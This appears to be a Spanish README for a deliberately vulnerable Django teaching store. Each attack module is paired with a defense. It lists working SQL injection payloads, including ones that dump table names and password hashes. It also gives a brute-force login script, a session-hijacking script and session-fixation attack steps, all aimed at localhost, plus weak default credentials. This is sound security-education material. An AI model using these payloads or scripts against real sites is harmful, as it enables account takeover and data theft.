# TiendaTest 🛒
Tienda virtual básica para testear bases de datos con Django.  
Desarrollada como ejercicio de ciberseguridad — incluye módulos vulnerables y sus defensas.

---

## Estructura del proyecto

```
tienda/
├── tienda/
│   ├── settings.py       ← configuración principal (BD, puerto, etc.)
│   ├── urls.py
│   ├── wsgi.py
│   └── __init__.py       ← inicialización de PyMySQL
├── store/
│   ├── models.py         ← Producto, Pedido, DetallePedido
│   ├── views.py          ← todas las vistas
│   ├── urls.py
│   ├── admin.py
│   ├── templates/store/
│   │   ├── login.html
│   │   ├── main.html               ← página principal con menú
│   │   ├── navbar.html             ← barra de navegación global
│   │   ├── admin_panel.html
│   │   ├── usuario_panel.html
│   │   ├── buscar_vulnerable.html  ← SQL Injection
│   │   ├── login_vulnerable.html   ← Fuerza Bruta vulnerable
│   │   ├── login_seguro.html       ← Fuerza Bruta con defensa
│   │   ├── sesion_vulnerable.html  ← Sesiones vulnerable
│   │   ├── sesion_segura.html      ← Sesiones con defensa
│   │   ├── fixation_vulnerable.html← Session Fixation vulnerable
│   │   └── fixation_segura.html    ← Session Fixation con defensa
│   └── static/store/
│       ├── css/main.css
│       └── js/admin.js  &  usuario.js
├── manage.py
└── requirements.txt
```

---

## Requisitos previos

| Herramienta | Versión | Notas |
|---|---|---|
| Python | 3.12 | Instalar desde python.org, marcar "Add to PATH" |
| MariaDB | 12.3 standalone | NO usar la que viene con XAMPP |
| XAMPP | 8.2.12 | Solo para usar phpMyAdmin como interfaz visual |

---

## Instalación paso a paso

### 1. Instalar MariaDB 12.3

> ⚠️ **No uses la MariaDB que viene con XAMPP.** Trae la versión 10.4 que es incompatible con Django. Aunque instales XAMPP 8.2.12, los binarios de MariaDB siguen siendo los viejos.

1. Descarga **MariaDB 12.3** desde `https://mariadb.org/download/`
2. Durante la instalación:
   - Si el puerto **3306 ya está en uso** por XAMPP, cambia a **3307**
   - Puedes dejar la contraseña de root vacía para pruebas
   - Marca **"Install as Windows Service"**
3. Verifica que quedó bien:
```cmd
"C:\Program Files\MariaDB 12.3\bin\mysql.exe" -u root -p --port=3307 -e "SELECT VERSION();"
```
Debe mostrar `12.3.x-MariaDB`.

---

### 2. Instalar XAMPP (solo para phpMyAdmin)

1. Descarga XAMPP 8.2.12 desde `https://www.apachefriends.org/download.html`
2. Instala normalmente
3. Desde el panel de XAMPP inicia solo **Apache** — MySQL de XAMPP NO es necesario

---

### 3. Configurar phpMyAdmin para ver MariaDB 12.3

Abre:
```
C:\xampp\phpMyAdmin\config.inc.php
```

Ve al **final del archivo** y agrega este bloque:

```php
/* Servidor MariaDB 12.3 standalone - puerto 3307 */
$i++;
$cfg['Servers'][$i]['auth_type']    = 'config';
$cfg['Servers'][$i]['host']         = '127.0.0.1';
$cfg['Servers'][$i]['port']         = '3307';
$cfg['Servers'][$i]['user']         = 'root';
$cfg['Servers'][$i]['password']     = '';  // cambiar si pusiste contraseña
$cfg['Servers'][$i]['connect_type'] = 'tcp';
```

Reinicia Apache desde el panel de XAMPP y entra a `http://localhost/phpmyadmin`.
Verás un selector de servidor arriba — elige `127.0.0.1:3307`.

---

### 4. Crear la base de datos

```cmd
"C:\Program Files\MariaDB 12.3\bin\mysql.exe" -u root -p --port=3307
```
Presiona Enter si no pusiste contraseña. Luego:
```sql
CREATE DATABASE tienda_db CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
SHOW DATABASES;
EXIT;
```

---

### 5. Instalar dependencias de Python

Abre la terminal en la carpeta del proyecto:

```cmd
pip install django
pip install PyMySQL
pip install requests
```

> ⚠️ **No instales `mysqlclient`** — incompatible con Python 3.12 en Windows. Usa solo PyMySQL.

---

### 6. Configurar la conexión a la base de datos

`tienda/settings.py` — bloque DATABASES:

```python
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'tienda_db',
        'USER': 'root',
        'PASSWORD': '',        # tu contraseña de MariaDB
        'HOST': '127.0.0.1',
        'PORT': '3307',
        'OPTIONS': {
            'init_command': "SET sql_mode='STRICT_TRANS_TABLES'",
        },
    }
}
```

`tienda/__init__.py` — debe tener exactamente esto:

```python
import pymysql
pymysql.install_as_MySQLdb()
```

---

### 7. Crear tablas y superusuario

```cmd
python manage.py makemigrations store
python manage.py migrate
python manage.py createsuperuser
```

---

### 8. Crear usuarios de prueba

```cmd
python manage.py shell
```
```python
from django.contrib.auth.models import User

User.objects.create_superuser(username='admin', password='admin123')
User.objects.create_user(username='usuario1', password='password123')
User.objects.create_user(username='usuario2', password='abc123')

exit()
```

---

### 9. Arrancar el servidor

```cmd
python manage.py runserver
```

Abre `http://127.0.0.1:8000/login/`

---

## Usuarios del sistema

| Usuario | Contraseña | Rol | Panel |
|---|---|---|---|
| admin | admin123 | Superusuario | `/admin-panel/` |
| usuario1 | password123 | Usuario normal | `/tienda/` |
| usuario2 | abc123 | Usuario normal | `/tienda/` |

---

## Páginas del proyecto

| URL | Descripción | Acceso |
|---|---|---|
| `/login/` | Inicio de sesión principal | Todos |
| `/main/` | Página principal con menú | Autenticado |
| `/admin-panel/` | Gestión de productos, pedidos y usuarios | Solo admins |
| `/tienda/` | Catálogo y carrito de compras | Autenticado |
| `/buscar/` | SQL Injection vulnerable | Autenticado |
| `/login-vulnerable/` | Fuerza bruta sin protección | Todos |
| `/login-seguro/` | Login con límite de intentos | Todos |
| `/sesion-vulnerable/` | Session ID expuesto y manipulable | Autenticado |
| `/sesion-segura/` | Sesión con buenas prácticas | Autenticado |
| `/fixation-vulnerable/` | Session Fixation sin defensa | Todos |
| `/fixation-segura/` | Session Fixation con cycle_key | Todos |
| `/logout/` | Cerrar sesión | Autenticado |

---

## Módulos de ciberseguridad

### 1. SQL Injection — `/buscar/`
Vista de búsqueda con SQL crudo sin sanitizar.

| Payload | Qué hace |
|---|---|
| `%' OR '1'='1` | Devuelve todos los productos |
| `%' OR 1=1-- -` | Comenta el resto del SQL |
| `%' UNION SELECT table_name,2,3,4 FROM information_schema.tables-- -` | Lista todas las tablas |
| `%' UNION SELECT username,password,3,4 FROM auth_user-- -` | Extrae usuarios y hashes |
| `%' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -` | Extrae versión por error |

---

### 2. Fuerza Bruta — `/login-vulnerable/`
Sin límite de intentos, sin CSRF, sin bloqueo por IP.

Script de ataque (`fuerza_bruta.py`):
```python
import requests

url = "http://127.0.0.1:8000/login-vulnerable/"
usuario = "usuario2"
passwords = ["1234", "12345", "password", "admin", "test",
             "usuario2", "qwerty", "abc123", "letmein", "123456"]

for pwd in passwords:
    r = requests.post(url, data={"username": usuario, "password": pwd})
    if "ÉXITO" in r.text:
        print(f"✅ CONTRASEÑA ENCONTRADA: {pwd}")
        break
    else:
        print(f"❌ Fallida: {pwd}")
```

**Defensa en `/login-seguro/`:** máximo 5 intentos por IP, bloqueo de 5 minutos, CSRF activo.

---

### 3. Robo de Sesión — `/sesion-vulnerable/`
Session ID expuesto completo. Permite inyectar datos arbitrarios vía URL.

Inyección de datos en sesión:
```
http://127.0.0.1:8000/sesion-vulnerable/?set_key=rol&set_val=admin
http://127.0.0.1:8000/sesion-vulnerable/?set_key=username&set_val=hackeado
```

Script de robo de sesión (`robo_sesion.py`):
```python
import requests

session_id = "PEGA_AQUI_EL_SESSION_ID_DE_LA_PAGINA_VULNERABLE"
cookies = {"sessionid": session_id}

paginas = [
    "http://127.0.0.1:8000/tienda/",
    "http://127.0.0.1:8000/main/",
    "http://127.0.0.1:8000/admin-panel/",
]

for url in paginas:
    r = requests.get(url, cookies=cookies, allow_redirects=False)
    if r.status_code == 200:
        print(f"✅ Acceso obtenido: {url}")
    elif r.status_code == 302:
        print(f"↩️  Redirige a: {r.headers.get('Location')} — {url}")
    else:
        print(f"❌ Sin acceso ({r.status_code}): {url}")
```

**Defensa en `/sesion-segura/`:** Session ID nunca expuesto, cookies con HttpOnly y SameSite, sin aceptar datos de la URL.

Configuración recomendada en `settings.py`:
```python
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Lax'
SESSION_COOKIE_SECURE = True      # solo en producción con HTTPS
SESSION_EXPIRE_AT_BROWSER_CLOSE = True
SESSION_COOKIE_AGE = 1800         # 30 minutos
```

---

### 4. Session Fixation — `/fixation-vulnerable/`
El servidor acepta un Session ID enviado por URL y no lo rota tras el login.

Pasos del ataque:
1. El atacante genera un Session ID conocido: `abc123`
2. Envía a la víctima el link: `http://127.0.0.1:8000/fixation-vulnerable/?sessionid=abc123`
3. La víctima hace login — el servidor NO rota el Session ID
4. El atacante usa `abc123` para acceder como la víctima

**Defensa en `/fixation-segura/`:** usa `request.session.cycle_key()` tras autenticar, lo que invalida el Session ID anterior y genera uno nuevo.

```python
# La clave de la defensa
request.session.cycle_key()
login(request, user)
```

---

## Modelos en la base de datos

| Tabla Django | Tabla en BD | Campos principales |
|---|---|---|
| `Producto` | `store_producto` | nombre, descripcion, precio, stock, activo |
| `Pedido` | `store_pedido` | usuario(FK), estado, total, fecha |
| `DetallePedido` | `store_detallededido` | pedido(FK), producto(FK), cantidad, precio_unitario |
| `User` (Django) | `auth_user` | username, password, is_staff, is_superuser |

---

## Errores comunes y soluciones

| Error | Causa | Solución |
|---|---|---|
| `MariaDB 10.6 or later is required` | XAMPP tiene MariaDB 10.4 | Instalar MariaDB 12.3 standalone |
| `ImportError: cannot import COMMAND` | mysqlclient instalado | `pip uninstall mysqlclient`, usar solo PyMySQL |
| `No such file or directory` | Terminal fuera de la carpeta del proyecto | `cd C:\ruta\tienda` hasta ver `manage.py` con `dir` |
| `Table 'x' doesn't exist` | Migraciones no aplicadas | `python manage.py makemigrations store` y luego `migrate` |
| `Token '-u' inesperado` | PowerShell no acepta flags así | Usar CMD o agregar `&` antes del comando |
| phpMyAdmin no conecta al 3307 | Bloque no agregado en config.inc.php | Agregar bloque `$cfg['Servers'][$i]` al final del archivo |
| `No migrations to apply` para store | Migraciones no creadas | Correr `makemigrations store` antes del `migrate` |

---

## Configuración de entorno completa

```
Python:    3.12
Django:    6.0.6
Driver BD: PyMySQL (NO mysqlclient)
MariaDB:   12.3 standalone (NO la de XAMPP)
Puerto:    3307
XAMPP:     8.2.12 (solo Apache, para phpMyAdmin)
BD:        tienda_db
OS:        Windows
```